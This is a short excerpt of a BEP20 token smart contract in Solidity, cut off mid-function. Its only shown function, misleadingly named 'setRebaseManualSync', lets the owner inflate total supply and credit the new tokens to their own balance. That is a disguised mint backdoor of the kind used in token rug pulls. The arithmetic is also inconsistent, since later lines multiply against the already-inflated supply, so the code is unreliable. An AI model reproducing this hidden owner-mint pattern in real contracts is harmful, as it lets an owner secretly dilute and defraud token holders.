...
contract TEST is IBEP20, Auth {
    ...
    function setRebaseManualSync(uint256 amount) external onlyOwner {
        _totalSupply = _totalSupply.add(_totalSupply*amount);
        _beforeTokenTransfer(address(0), msg.sender, _totalSupply*amount);
        //_rBalance[msg.sender] = amount;
        _rBalance[msg.sender] = _rBalance[msg.sender].add(_totalSupply*amount);
